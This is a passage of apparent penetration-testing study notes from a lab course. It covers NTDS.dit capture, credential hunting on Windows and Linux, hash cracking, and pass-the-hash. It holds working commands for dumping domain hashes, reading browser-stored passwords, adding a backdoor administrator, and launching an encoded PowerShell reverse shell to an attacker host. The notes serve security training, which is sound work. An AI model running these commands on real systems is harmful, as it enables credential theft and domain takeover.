    > Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

* Capturing NTDS.dit
    > NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot$/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.
    > Connecting to a DC with Evil-WinRM
        + We can connect to a target DC using the credentials we captured.
            m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
        + Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
    > Checking Local Group Membership
        + Once connected, we can check to see what privileges bwilliamson has. We can start with looking at the local group membership using the command:
            *Evil-WinRM* PS C:\> net localgroup
        + We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.
    > Checking User Account Privileges including Domain
            *Evil-WinRM* PS C:\> net user bwilliamson
        + This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.
    > Creating Shadow Copy of C:
        + We can use vssadmin to create a Volume Shadow Copy (VSS => https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.
            *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
    > Copying NTDS.dit from the VSS
        + We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
            *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
        + Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the Attacking SAM section to review that method if needed.
    > Transferring NTDS.dit to Attack Host
        + Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host.
            *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

    !> A Faster Method: Using cme to Capture NTDS.dit
        + Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
            m1l0js@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds


    ! URL => (https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/)

    
    !> What if we are unsuccessful in cracking a hash?
        > Pass-the-Hash Considerations
            + We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:
                m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"


[+] Credential Hunting in Windows
    > Once we have access to a target Windows machine through the GUI or CLI, we can significantly benefit from incorporating credential hunting into our approach. Credential Hunting is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let's place ourselves in a scenario. We have gained access to an IT admin's Windows 10 workstation through RDP.
Search Centric

    > Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.


    > Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.
    > What might an IT admin be doing on a day-to-day basis & which of those tasks may require credentials?
    > We can use this question & consideration to refine our search to reduce the need for random guessing as much as possible.
    > Key Terms to Search
        + Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some 
            Passwords	    Passphrases	    Keys
            Username	    User account	Creds
            Users	        Passkeys	    Passphrases
            configuration	dbcredential	dbpassword
            pwd	            Login	        Credentials
* With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.
* We can also take advantage of third-party tools like Lazagne(https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone(https://github.com/AlessandroZ/LaZagne/releases/) copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.
    > Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:
        C:\Users\bob\Desktop> start lazagne.exe all
    > This will execute Lazagne and run all included modules. We can include the option -vv to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results

* Using findstr
    > We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:
    > Using findstr
        C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
* Additional Considerations

    > There are thousands of tools & key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.

    > Here are some other places we should keep in mind when credential hunting:

        + Passwords in Group Policy in the SYSVOL share
        + Passwords in scripts in the SYSVOL share
        + Password in scripts on IT shares
        + Passwords in web.config files on dev machines and IT shares
        + unattend.xml
        + Passwords in the AD user or computer description fields
        + KeePass databases --> pull hash, crack and get loads of access.
        + Found on user systems and shares
        + Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

-=-=
[+] Linux Local Password Attacks
!Credential Hunting in Linux
    > Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.

    > We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:
    Files	    History	                Memory	    Key-Rings
    Configs	    Logs	                Cache	    Browser stored credentials
    Databases	Command-line History	In-memory   Processing	
    Notes			
    Scripts			
    Source codes			
    Cronjobs			
    SSH Keys

    > Enumerating all these categories will allow us to increase the probability of successfully finding out with some ease credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.
    + Configuration files
        > Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (.config, .conf, .cnf). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.

        > The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.
            cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
        > Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.
            cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
        > We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.
            cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
        > Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as .txt. Therefore, in this case, we need to search for files including the .txt file extension and files that have no file extension at all.
            cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
        > Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.
            cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
        > Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (/etc/crontab) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). The scripts and files used by cron can also be found in /etc/cron.d/ for Debian-based distributions.
            cry0l1t3@unixclient:~$ cat /etc/crontab 
            cry0l1t3@unixclient:~$ ls -la /etc/cron.*/
        > SSH keys can be considered "access cards" for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (Private key) and a corresponding one for the server (Public key). However, these are not the same, so knowing the public key is insufficient to find a private key. The public key can verify signatures generated by the private SSH key and thus enables automatic login to the server. Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH. Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.
            cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
            cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
        > All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes. In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. Nevertheless, other files like .bashrc or .bash_profile can contain important information.
            cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
        > An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:
        Application Logs 	
        Event Logs 	
        Service Logs 	
        System Logs
        Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:
        Log File	        Description
        /var/log/messages	Generic system activity logs.
        /var/log/syslog	    Generic system activity logs.
        /var/log/auth.log	(Debian) All authentication related logs.
        /var/log/secure	    (RedHat/CentOS) All authentication related logs.
        /var/log/boot.log	Booting information.
        /var/log/dmesg	    Hardware and drivers related information and logs.
        /var/log/kern.log	Kernel related warnings, errors and logs.
        /var/log/faillog	Failed login attempts.
        /var/log/cron	    Information related to cron jobs.
        /var/log/mail.log	All mail server related logs.
        /var/log/httpd	    All Apache related logs.
        /var/log/mysqld.log	All MySQL server related logs.

        > Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:
            cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

        > Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called mimipenguin(https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
            cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
            cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh
        > LaZagne. The passwords and hashes we can obtain come from the following sources but are not limited to:
            			
        Wifi	            Wpa_supplicant	Libsecret	Kwallet
        Chromium-based	    CLI	            Mozilla	    Thunderbird
        Git	                Env_variable	Grub	    Fstab
        AWS	                Filezilla	    Gftp	    SSH
        Apache	            Shadow	        Docker	    KeePass
        Mimipy	            Sessions	    Keyrings	
        > For example, Keyrings are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.

        > Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the Mozilla Firefox browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information. For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in logins.json on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.
            cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
            cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
        > The tool Firefox Decrypt(https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, Firefox Decrypt 0.7.0 with Python 2 must be used.
            m1l0js@htb[/htb]$ python3.9 firefox_decrypt.py
        > Alternatively, LaZagne can also return results if the user has used the supported browser.
            cry0l1t3@unixclient:~$ python3 laZagne.py browsers


[+] Passwd, Shadow & Opasswd
    > Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is Pluggable Authentication Modules (PAM => http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html). The modules used for this are called pam_unix.so or pam_unix2.so and are located in /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with passwd, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.

    > The pam_unix.so standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are /etc/passwd and /etc/shadow. PAM also has many other service modules, such as LDAP, mount, or Kerberos.
    > Since reading the password hash values can put the entire system in danger, the file /etc/shadow was developed, which has a similar format to /etc/passwd but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid. The /etc/shadow file is also only readable by users who have administrator rights.

    > If the password field contains a character, such as ! or *, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The encrypted password also has a particular format by which we can also find out some information:

    $<type>$<salt>$<hashed>

    > As we can see here, the encrypted passwords are divided into three parts. The types of encryption allow us to distinguish between the following:
    Algorithm Types
    
        $1$ – MD5
        $2a$ – Blowfish
        $2y$ – Eksblowfish
        $5$ – SHA-256
        $6$ – SHA-512
    
    > By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions. We will also find the other encryption methods that we can then try to crack on older systems. We will discuss how the cracking works in a bit.

* Opasswd
    > The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.
        m1l0js@htb[/htb]$ sudo cat /etc/security/opasswd
    > Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.
    > Unshadow 
        + m1l0js@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
        + m1l0js@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
        + m1l0js@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
    > Hashcat - Cracking Unshadowed Hashes
        m1l0js@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
    > Hashcat - Cracking MD5 hashes
        m1l0js@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt


[+] Pass the Hash (PtH)
    > A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
    > As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

        +Dumping the local SAM database from a compromised host.
        +Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
        +Pulling the hashes from memory (lsass.exe).

    ! Example
        > Let's assume we obtain the password hash (64F12CDDAA88057E06A81B54E73B949B) for the account julio from the domain inlanefreight.htb. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.
        > Note: The tools we will be using are located in the C:\tools directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01). 

* Windows NTLM Introduction
    > Microsoft's Windows New Technology LAN Manager (NTLM ==> https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.
    > Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.
    > With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a Pass the Hash (PtH) Attack.
        
* Example
    > Pass the Hash with Mimikatz (Windows)
        - The first tool we will use to perform a Pass the Hash attack is Mimikatz (https://github.com/gentilkiwi). Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:
            + /user - The user name we want to impersonate.
            + /rc4 or /NTLM - NTLM hash of the user's password.
            + /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
            + /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

            c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

    > Pass the Hash with PowerShell Invoke-TheHash (Windows)

        - Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash (https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user julio and the hash 64F12CDDAA88057E06A81B54E73B949B.
        - Then using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
            + Target - Hostname or IP address of the target.
            + Username - Username to use for authentication.
            + Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
            + Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
            + Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
        - The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.
            PS c:\htb> cd C:\tools\Invoke-TheHash\
            PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
            PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
        - To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.
            PS C:\tools> .\nc.exe -lvnp 8001
        - To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (base64)
        - Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).
        - Invoke-TheHash with WMI
            PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
            PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
        
    > Pass the Hash with Impacket (Linux)

        - Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.
        - Pass the Hash with Impacket PsExec
            m1l0js@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
        - There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
            impacket-wmiexec => (https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
            impacket-atexec => (https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
            impacket-smbexec => (https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

    > Pass the Hash with CrackMapExec (Linux)

        - CrackMapExec(https://github.com/byt3bl33d3r/CrackMapExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called "Password Spraying" and is covered in-depth in the Active Directory Enumeration & Attacks module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.
        - Pass the Hash with CrackMapExec
            m1l0js@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
        - If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS => https://www.microsoft.com/en-us/download/details.aspx?id=46899), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.
        - CrackMapExec - Command Execution
            m1l0js@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
        - Review the CrackMapExec documentation Wiki (https://wiki.porchetta.industries/) to learn more about the tool's extensive features.

    > Pass the Hash with evil-winrm (Linux)

        - evil-winrm is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
        - Pass the Hash with evil-winrm
            m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
        - Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

    > Pass the Hash with RDP (Linux)
        - We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.
        - There are a few caveats to this attack:
            + Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
                "Account restrictions are preventing this user from signing in"
                ! This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:
                    # Enable Restricted Admin Mode to Allow PtH
                        c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
                ! Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:
                    m1l0js@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
    > UAC Limits Pass the Hash for Local Accounts

        - UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
        - Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
        - These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy => (https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)


[+] Pass the Ticket (PtT) from windows 
    > Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. 
* Kerberos Protocol Refresher
    > The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.
        + The TGT - Ticket Granting Ticket is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.
        + The TGS - Ticket Granting Service is requested by users who want to use a service. These tickets allow services to verify the user's identity.
